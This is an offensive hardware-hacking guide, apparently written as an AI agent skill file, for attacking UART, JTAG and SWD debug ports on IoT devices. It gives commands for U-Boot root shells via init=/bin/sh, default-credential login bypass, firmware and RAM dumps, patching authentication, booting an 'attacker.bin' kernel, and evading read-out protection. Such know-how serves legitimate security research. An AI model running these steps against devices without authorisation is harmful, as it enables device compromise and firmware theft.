---
name: offensive-uart-jtag-swd
description: "UART, JTAG, and SWD debug interface attack methodology — UART baud-rate discovery, console drop with U-Boot/Linux init shells, USB-UART adapter selection (FT232, CP2102, CH340), JTAG enumeration with OpenOCD/UrJTAG, JTAG-based memory dump, ARM SWD with J-Link / Black Magic Probe, RDP (read-out protection) bypass, and debug-port-based runtime instrumentation. Use after hardware recon to gain low-level access to firmware, memory, and the running kernel."
---

# UART / JTAG / SWD Attacks

The fastest path to firmware extraction, runtime memory access, and unauthenticated shells. Many consumer IoT devices ship with active debug interfaces — the manufacturer never disabled them.

## Quick Workflow

1. UART first — cheap, common, often yields immediate root shell
2. JTAG/SWD when UART is locked or unhelpful
3. Capture full memory dump for offline analysis
4. If RDP is set, attempt fault-injection or downgrade attacks (see `offensive-fault-injection`)

---

## UART

### Adapter Choice

| Adapter | Notes |
|---|---|
| FT232RL | Most stable, multi-OS support |
| CP2102 / CP2104 | Cheap, widely available |
| CH340G | Cheapest; driver issues on Win 10/11 |
| Bus Pirate | UART + SPI + I2C + JTAG generic |
| Glasgow Interface Explorer | Modern multi-protocol |

Verify 3.3V vs 5V logic levels — most modern IoT is 3.3V; connecting 5V to a 3.3V UART can damage the SoC.

### Pin Connections

```
Adapter TX  → Device RX
Adapter RX  → Device TX
Adapter GND → Device GND
                (do NOT connect VCC unless you understand the device's power architecture)
```

### Baud Rate Discovery

```bash
# Scan common bauds
for b in 9600 19200 38400 57600 115200 230400 460800 921600 1500000; do
  echo "=== $b ==="
  timeout 5 minicom -b $b -D /dev/ttyUSB0 -C "uart_$b.log"
done
grep -l -E "U-Boot|Linux|Bootloader|console|login" uart_*.log

# Or use baudrate.py
python3 baudrate.py /dev/ttyUSB0
```

115200 is by far the most common; 921600 is common on Realtek-based routers.

### What You'll See

| Output | Meaning |
|---|---|
| Garbled chars at all rates | Wrong wires or 5V vs 3.3V mismatch |
| Boot messages → login prompt | Locked behind credentials |
| Boot messages → root shell | No login required (very common) |
| U-Boot countdown | Drop to U-Boot console |
| Hex / binary spew | Custom firmware protocol — analyze separately |

### Login Prompt Bypasses

If a login prompt appears:

- Try `root/<empty>`, `admin/<empty>`, `root/root`, `admin/admin`
- Try device-specific defaults (vendor + model OSINT)
- Reboot and watch for password set in U-Boot env: `printenv | grep -i pass`
- Reboot and break to U-Boot, set `bootargs init=/bin/sh`

### U-Boot Console Drop

```
Hit any key to stop autoboot:  3
=> printenv
=> setenv bootargs ${bootargs} init=/bin/sh
=> boot
# → / shell as root, no login
```

Useful U-Boot commands:
- `printenv` — full environment, often includes flash partition layout
- `mmc info`, `nand info`, `sf probe` — flash chip identification
- `md.b 0x80000000 0x100` — memory dump from running kernel/U-Boot
- `tftpboot 0x80000000 attacker.bin; bootm 0x80000000` — boot attacker kernel
- `loadb 0x80000000` — upload binary over serial xmodem

### When U-Boot Is Locked

- `CONFIG_DELAY_AUTOBOOT_KEYED` — environment var sets specific keypress
- Custom magic strings (vendor-specific; check strings of the U-Boot binary if you can dump it)
- Glitch the version-check / signature-check (see `offensive-fault-injection`)
- Replace U-Boot via SPI-flash chip-off, modify, reflash

## JTAG

### Setup

```bash
# Pick adapter and target config
openocd -f interface/jlink.cfg -f target/stm32f4x.cfg

# Or for unknown ARM SoCs
openocd -f interface/jlink.cfg -c "transport select jtag" \
        -c "jtag newtap auto0 tap -irlen 4 -expected-id 0x4ba00477"
```

OpenOCD config files cover most known SoCs. For unknown chips, manual scan:

```bash
openocd -f interface/jlink.cfg -c "transport select jtag; jtag init; scan_chain"
# Outputs IDCODE; lookup against vendor database
```

### Memory Dump

```bash
openocd -f interface/jlink.cfg -f target/stm32f4x.cfg \
  -c "init; halt; flash read_bank 0 fw.bin 0 0x100000; exit"
```

For unknown memory layout, dump RAM chunks via `mdw <addr> <count>` and reconstruct.

### Halt / Single-Step / Memory Write

```bash
telnet localhost 4444
> halt
> reg pc      # read program counter
> mdw 0x20000000 0x10
> mww 0x20000004 0xCAFEBABE
> resume
```

JTAG gives full memory R/W to the running CPU. With this, patch authentication, dump secrets from RAM, modify control flow.

## SWD (ARM Cortex-M)

Two-wire variant of JTAG for resource-constrained MCUs. Same OpenOCD-style access, fewer pins:

```bash
openocd -f interface/stlink.cfg -f target/stm32f1x.cfg
```

### RDP (Read-Out Protection)

ARM Cortex-M MCUs implement RDP fuses that block JTAG/SWD memory read:

| Level | Effect |
|---|---|
| RDP Level 0 | No protection — full debug access |
| RDP Level 1 | Read locked, write enabled — chip-erase to downgrade |
| RDP Level 2 | Read + write locked — permanent (un-recoverable) |

For RDP Level 1: `mass erase` returns the chip to Level 0, but wipes firmware. If goal is firmware extraction, abandon and try fault injection.

For RDP Level 2: hardware glitching (see `offensive-fault-injection`) is the only software path.

### SAM-BA / Bootloader Modes

Atmel SAM, ESP32, STM32 have ROM bootloaders accessible via specific boot pin states:

```bash
# STM32 system bootloader (BOOT0=1, BOOT1=0 → ROM bootloader on UART/USB)
stm32flash -r firmware.bin /dev/ttyUSB0

# ESP32 ROM bootloader
esptool.py --port /dev/ttyUSB0 read_flash 0 0x400000 firmware.bin

# Atmel SAM-BA via USB
sam-ba -p \\.\COM3 -d at91sam7s256 -a "read_flash(0,0x40000,fw.bin)"
```

These ROM bootloaders are usually not behind RDP — physical access typically gives firmware dump even when JTAG is locked.

## Debug Interface Anti-Tamper

Some modern devices:
- Disable JTAG via efuse on first boot (one-way fuse)
- Encrypted JTAG requiring vendor-side key
- Boundary-scan TAP only (no debug commands; just JTAG ID)

For these, pivot to:
- Fault injection at boot to corrupt the JTAG-disable fuse check
- Bus snooping during boot ROM execution to recover keys
- Side-channel analysis of secure boot signature verification

## Engagement Cheatsheet

```bash
# 1. UART
sudo screen /dev/ttyUSB0 115200    # try common bauds
# (or python3 baudrate.py /dev/ttyUSB0)

# 2. If U-Boot console available, drop to root
=> setenv bootargs ${bootargs} init=/bin/sh
=> boot

# 3. JTAG enumeration if UART locked
openocd -f interface/jlink.cfg -c "transport select jtag; jtag init; scan_chain"

# 4. SWD on Cortex-M MCUs
openocd -f interface/stlink.cfg -f target/stm32f1x.cfg

# 5. Dump flash
openocd -c "init; halt; flash read_bank 0 fw.bin 0 0x100000; exit"

# 6. Try ROM bootloader if JTAG protected
esptool.py --port /dev/ttyUSB0 read_flash 0 <size> fw.bin
```

## Detection

- UART connection visible only with case open — physical access required
- JTAG/SWD also requires physical access in 99% of cases
- Boot logs may show "debugger detected" notices; firmware can refuse to boot — bypass via fault injection or boot-mode pins

---

## Key References

- OpenOCD: openocd.org
- ARM CoreSight architecture documentation
- ESP-IDF flash utilities
- "The Hardware Hacking Handbook" (Voorhoeve, van Woudenberg)
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/iot.md
